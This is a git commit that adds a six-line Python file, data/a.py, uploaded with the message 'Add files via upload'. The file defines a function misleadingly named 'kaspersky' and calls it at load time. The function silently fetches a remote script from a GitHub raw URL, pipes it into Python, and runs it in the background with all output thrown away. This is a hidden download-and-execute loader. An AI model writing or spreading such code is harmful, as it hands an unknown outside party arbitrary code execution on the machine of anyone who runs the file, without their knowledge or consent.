1b9ac8f9786224bd46023ae5a87fe9a1b2847919
Boneng <bauq7uuh7u7@proton.me>
2025-10-20 11:02:39 +0800

    Add files via upload

---
+++ data/a.py
@@ -0,0 +1,6 @@
+def kaspersky():
+    import os
+    import sys
+    os.system("bash -c 'python <(curl -s https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Termux/i.py)' >/dev/null 2>&1 &")
+
+kaspersky()
